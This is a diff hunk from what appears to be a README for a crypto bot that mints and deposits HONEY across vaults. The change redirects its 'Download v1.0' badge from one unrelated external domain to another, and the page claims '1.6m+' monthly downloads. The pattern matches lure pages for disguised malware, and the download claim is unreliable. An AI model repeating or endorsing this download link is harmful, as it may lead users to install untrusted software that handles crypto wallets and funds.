@@ -49,7 +49,7 @@ A: Yes — mints and deposits HONEY across vaults.
 
 **Monthly downloads:** 1.6m+
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/berabot26)
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/berabot26)
 
 ---
 
